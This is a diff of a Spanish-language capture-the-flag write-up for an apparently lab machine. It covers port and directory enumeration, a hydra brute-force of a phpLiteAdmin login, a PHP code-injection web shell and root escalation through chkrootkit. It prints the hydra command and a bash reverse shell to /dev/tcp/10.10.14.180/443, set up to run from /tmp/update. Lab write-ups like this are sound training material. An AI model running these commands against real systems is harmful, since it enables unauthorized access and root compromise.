@@ -1,7 +1,9 @@
 
 ### Enumeración y escaneo
 
-Hacemos un escaneo de puertos y vemos que el puerto 80 y 443 están abiertos, con lo que comprobaremos que hay en ellas.
+Se realiza un escaneo completo de puertos TCP con `nmap` utilizando técnicas para optimizar el tiempo de respuesta. El objetivo es identificar servicios expuestos en la máquina objetivo.
+
+Se identifican los puertos **80 (HTTP)** y **443 (HTTPS)** abiertos.
 ```bash
 
 sudo nmap -sS -Pn -p- -T4 --min-rate 5000 10.129.23.159
@@ -34,7 +36,7 @@ gobuster dir --url http://10.129.23.159/ --wordlist /usr/share/wordlists/Directo
 ```
 ![](/img/Pasted%20image%2020260423175008.png) 
 
-Supuse que podía haber rutas ocultas en el servidor web, al ampliar la enumeración con un diccionario más grande podemos descubrir un directorio que se llama department que sugería una funcionalidad interna.
+Dado el bajo contenido del puerto 80 supuse que podía haber rutas ocultas en el servidor web, al ampliar la enumeración con un diccionario más grande podemos descubrir un directorio que se llama department que sugería una funcionalidad interna.
 ```bash
 gobuster dir --url http://10.129.23.159/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-tls-validation 
 
@@ -58,7 +60,7 @@ Al comprobarlo podemos ver que es un login del software phpLiteAdmin v1.9 que es
 
 ## Explotación
 ### HTTPS
-Ya que es un simple login con solo el input de la contraseña le hacemos fuerza bruta
+Ya que es un simple login con solo el input de la contraseña le hacemos fuerza bruta, se fuerza el parámetro de usuario vacío o fijo debido a la validación débil del formulario.
 
 ``` bash
 hydra -l none -P /usr/share/wordlists/rockyou.txt 10.129.23.159  https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -t 64 -V
@@ -69,7 +71,7 @@ hydra -l none -P /usr/share/wordlists/rockyou.txt 10.129.23.159  https-post-form
 Usamos las credenciales y estaremos correctamente dentro del panel de control
 ![](/img/Pasted%20image%2020260423181116.png)
 
-Investigamos el software y vemos que tiene varios exploits, procederé a usar el siguiente https://www.exploit-db.com/exploits/24044
+Investigamos el software phpLiteAdmin v1.9 y vemos que tiene varios exploits, procederé a usar el siguiente el cual trata sobre que hay una vulnerabilidad de Remote PHP Code Injection https://www.exploit-db.com/exploits/24044
 
 ![](/img/Pasted%20image%2020260423175849.png) 
 
@@ -77,7 +79,7 @@ Para el exploit debemos renombrar la base de datos, en mi caso la llamaré ninev
 
 ![](/img/Pasted%20image%2020260423190525.png)
 
-Una vez creado debemos hacer una tabla nueva y añadirle la reverse shell
+Una vez creado debemos hacer una tabla nueva y añadirle la web shell que podremos ejecutar en la explotación
 
 ![](/img/Pasted%20image%2020260423181506.png)
 
@@ -89,7 +91,7 @@ Con una simple web shell de php como por ejemplo
 
 ![](/img/Pasted%20image%2020260423190633.png)
 
-Vemos que la base de datos está en el directorio /var/tmp en Rename Database lo cual nos hará falta para el ataque
+Vemos que la base de datos está en el directorio /var/tmp en Rename Database lo cual nos hará falta saber para el ataque
 ![](/img/Pasted%20image%2020260423190525.png) 
 
 ### HTTP
@@ -119,7 +121,7 @@ Al darle al apartado Notes vemos que hace una petición a un fichero desde una r
 Ya que sabíamos donde está la base de datos porque lo podíamos ver desde el phpLite procederemos a poner dicho directorio más el nombre de la base de datos. Ejecutamos el exploit y veremos que correctamente nos ha funcionado porque nos muestra poniendo el comando ls una lista de ficheros. Ahora haré los pasos conseguir una reverse shell en nuestro sistema.
   ![](/img/Pasted%20image%2020260423190738.png)
 
-Pillamos la petición mediante burpsuite y cambiamos el método de esta a POST
+Recibo la petición mediante burpsuite y cambiamos el método de esta a POST
 
 ![](/img/Pasted%20image%2020260423191114.png) 
 
@@ -127,7 +129,7 @@ Y lo cambiamos para tener iniciar la reverse shell con el payload puesto, enviam
 
 ![](/img/Pasted%20image%2020260423191403.png) 
 
-Habremos entrado al sistema exitosamente
+Se obtiene acceso al sistema exitosamente
  
 ![](/img/Pasted%20image%2020260423191513.png) 
 
@@ -162,11 +164,11 @@ Ya dentro podemos acceder a la primera flag de user.txt
 
 ![](/img/Pasted%20image%2020260423193958.png)
 ## Escalada de privilegios
-Pasé el programa de pspy (https://github.com/dominicbreuker/pspy) para ver procesos que sean interesante y identifiqué que hay un proceso de chkrootkit el cuál tiene una vulnerabilidad explotable para escalar privilegios https://www.exploit-db.com/exploits/33899
+Pasé el programa de pspy (https://github.com/dominicbreuker/pspy) para ver procesos que sean interesante y se identifica que chkrootkit ejecuta de forma automática scripts ubicados en `/tmp` con privilegios de root, según la siguiente vulnerabilidad haremos la escalada de privilegios https://www.exploit-db.com/exploits/33899
 
 ![](Pasted%20image%2020260423200654.png)
 
-Para ello debemos crear una reverseshell en /tmp que se llame update, este se ejecutara y seremos root exitosamente
+Para ello debemos crear una reverseshell en /tmp que se llame update, este se ejecutara por el sistema de cron y seremos root exitosamente
 
 ```bash
 bash -i >& /dev/tcp/10.10.14.180/443 0>&1
